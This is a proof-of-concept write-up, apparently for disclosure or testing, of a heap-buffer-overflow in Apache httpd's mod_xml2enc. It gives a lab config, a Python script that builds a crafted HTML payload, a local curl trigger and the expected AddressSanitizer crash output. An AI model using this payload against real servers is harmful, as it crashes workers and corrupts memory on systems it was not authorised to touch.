# PoC 196 - Output Buffer Length Not Adjusted After Skip

`fix_skipto()` advances `ctx->buf` past skippable response bytes but leaves
`ctx->bblen` unchanged, so `apr_xlate_conv_buffer()` later writes at the
advanced pointer using the original (oversized) capacity.

## Setup

httpd with `mod_xml2enc` and `mod_proxy_html` (or any consumer that drives
`xml2StartParse`). Build with `-fsanitize=address` so the overflow is
detectable as a heap-buffer-overflow.

`/tmp/httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule mime_module           modules/mod_mime.so
LoadModule headers_module        modules/mod_headers.so
LoadModule xml2enc_module        modules/mod_xml2enc.so
LoadModule proxy_html_module     modules/mod_proxy_html.so
LoadModule alias_module          modules/mod_alias.so
LoadModule dir_module            modules/mod_dir.so

DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    Require all granted
    AddOutputFilterByType xml2enc text/html
    xml2EncDefault iso-8859-1
    xml2StartParse text/html
</Directory>
```

`xml2StartParse text/html` enables `ENC_SKIPTO`, which lets `fix_skipto()`
advance past a leading prefix until the first recognized start tag.

## Trigger

Craft a payload whose first ~4 KB is skippable junk before `<html>`, with
the remainder filled with high-bit ISO-8859-1 bytes that double in size when
re-encoded to UTF-8:

```sh
mkdir -p /tmp/htdocs
python3 -c '
prefix  = b"<!--" + b"A"*4096 + b"-->"        # skipped before <html>
body    = b"<html><body>" + bytes([0xE9])*8192 + b"</body></html>"
open("/tmp/htdocs/skip.html","wb").write(prefix + body)
'
httpd -DFOREGROUND -f /tmp/httpd.conf &

curl -s -H 'Accept-Charset: utf-8' http://127.0.0.1:8080/skip.html >/dev/null
```

## Observed effect

- ASan reports a heap-buffer-overflow inside `apr_xlate_conv_buffer()` called
  from `xml2enc_ffunc()` (`modules/filters/mod_xml2enc.c:510`):

  ```
  ==pid==ERROR: AddressSanitizer: heap-buffer-overflow
  WRITE of size N at 0x...
      #0 ... apr_xlate_conv_buffer
      #1 ... xml2enc_ffunc mod_xml2enc.c:511
  ```

  The `WRITE` lands `ctx->bblen + 1 - skipped` bytes after the pool
  allocation base, exactly matching the gap created by `fix_skipto()`
  advancing `ctx->buf` without shrinking `ctx->bblen`.
- Without ASan, the worker corrupts adjacent pool memory; the request may
  return truncated UTF-8 or the worker SIGSEGVs on the next pool free.
- Log marker: `child pid ... exit signal Segmentation fault` plus an
  `apr_xlate_conv_buffer` frame near the top of the ASan/AddressSanitizer
  report.

Reachability is confirmed at `mod_xml2enc.c:312` where `xml2StartParse` sets
`ENC_SKIPTO` and at `mod_xml2enc.c:166` where `ctx->buf` is advanced without
shrinking `ctx->bblen`.
